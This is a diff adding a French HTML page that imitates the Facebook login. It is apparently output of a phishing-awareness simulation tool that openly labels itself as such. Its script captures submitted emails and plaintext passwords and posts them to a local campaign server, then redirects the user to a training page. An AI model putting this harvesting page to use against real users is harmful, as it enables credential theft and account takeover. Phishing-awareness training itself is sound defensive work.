@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="stylesheet" href="assets/style.css">
+    <link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAQAAEABAAoAQAAFgAAACgAAAAQAAAAIAAAAAEABAAAAAAAgAAAAAAAAAAAAAAAEAAAAAAAAAD///8A">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo-section">
+                <div class="logo"><img src="data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 40 40"%3E%3Cpath fill="%231877f2" d="M40 20.094C40 8.998 31.002 0 19.906 0S-.094 8.998-.094 20.094c0 10.024 7.336 18.33 16.938 19.906v-14.07h-5.098v-5.836h5.098v-4.452c0-5.034 2.996-7.813 7.591-7.813 2.198 0 4.496.393 4.496.393v4.944h-2.534c-2.496 0-3.274 1.549-3.274 3.139v3.789h5.57l-.89 5.836h-4.68v14.07C32.664 38.424 40 30.118 40 20.094z"/%3E%3C/svg%3E" alt="Logo" />
+                </div>
+                <h1>Se connecter à Facebook</h1>
+            </div>
+            
+            <form id="loginForm" class="login-form">
+                <div class="form-group">
+                    <label for="email">E-mail ou numéro de téléphone</label>
+                    <input type="text" id="email" name="email" required autocomplete="username">
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Mot de passe</label>
+                    <input type="password" id="password" name="password" required autocomplete="current-password">
+                </div>
+                
+                <div class="form-options">
+                    <label class="checkbox-label">
+                        <input type="checkbox" name="remember"> 
+                        Rester connecté
+                    </label>
+                    <a href="#" class="forgot-link">Mot de passe oublié ?</a>
+                </div>
+                
+                <button type="submit" class="login-btn">Se connecter</button>
+            </form>
+            
+            <div class="footer-links">
+                <p class="fallback-notice">
+                    ⚠️ <strong>Simulation de phishing</strong><br>
+                    Cette page a été générée automatiquement car le site original (https://www.facebook.com/login) ne peut pas être cloné directement.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+    <script>
+      (function() {
+        console.log('PhishWise tracking activé');
+
+     document.addEventListener('DOMContentLoaded', function() {
+          const forms = document.querySelectorAll('form');
+
+          forms.forEach(function(form) {
+            form.addEventListener('submit', function(e) {
+              e.preventDefault();
+
+             const formData = new FormData(form);
+              const data = {};
+
+              for (let [key, value] of formData.entries()) {
+                data[key] = value;
+              }
+
+             data._campaignId = '6865e80ba3ba0587ff7f7e51';
+              data._timestamp = new Date().toISOString();
+             
+             data._userAgent = navigator.userAgent;
+              data._referrer = document.referrer;
+              data._url = window.location.href;
+
+            fetch('http://localhost:5000/api/phishing/capture', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+             }).then(function() {
+                window.location.href = 'http://localhost:5000/learning/6865e80ba3ba0587ff7f7e51';
+              }).catch(function(error) {
+               console.error('Erreur lors de l\'envoi des données:', error);
+                setTimeout(function() {
+                  window.location.href = 'http://localhost:5000/learning/6865e80ba3ba0587ff7f7e51';
+                }, 1000);
+              });
+            });
+          });
+
+         document.addEventListener('click', function(e) {
+            if (e.target.tagName === 'A' || e.target.closest('a')) {
+              const link = e.target.tagName === 'A' ? e.target : e.target.closest('a');
+
+           if (link.href.startsWith('http://localhost:5000') || link.getAttribute('onclick')) {
+                 e.preventDefault();
+              }
+
+             fetch('http://localhost:5000/api/phishing/track-click', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                  campaignId: '6865e80ba3ba0587ff7f7e51',
+                  clickedUrl: link.href,
+                  timestamp: new Date().toISOString(),
+                  userAgent: navigator.userAgent
+                })
+              }).catch(console.error);
+         }
+          });
+        });
+      })();
+    </script>
+</body>
+</html>
